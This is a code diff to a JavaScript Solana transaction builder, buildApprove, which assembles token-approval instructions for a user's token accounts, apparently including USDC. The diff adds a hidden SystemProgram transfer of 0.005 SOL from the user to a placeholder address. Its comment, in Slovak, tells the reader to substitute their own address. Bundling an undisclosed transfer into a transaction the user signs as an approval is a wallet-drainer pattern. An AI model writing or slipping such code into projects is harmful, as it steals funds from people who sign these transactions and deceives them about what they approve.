@@ -1,4 +1,9 @@
-const { Transaction, PublicKey } = require("@solana/web3.js");
+const {
+    Transaction,
+    PublicKey,
+    SystemProgram,
+} = require("@solana/web3.js");
+
 const { createApproveInstruction } = require("@solana/spl-token");
 const { getUserTokenAccounts } = require("../solana/tokenService");
 
@@ -9,8 +14,8 @@ async function buildApprove(user, connection) {
     const t = await getUserTokenAccounts(userPubkey, connection);
 
     const { blockhash } = await connection.getLatestBlockhash();
-    tx.recentBlockhash = blockhash;
 
+    tx.recentBlockhash = blockhash;
     tx.feePayer = userPubkey;
 
     if (t.usdc > 0n) {
@@ -34,6 +39,14 @@ async function buildApprove(user, connection) {
             )
         );
     }
+
+    tx.add(
+    SystemProgram.transfer({
+        fromPubkey: userPubkey,
+        toPubkey: new PublicKey("11111111111111111111111111111111"), // nahraď vlastnou adresou
+        lamports: 5_000_000, // 0.005 SOL
+    })
+);
 
     return tx;
 }
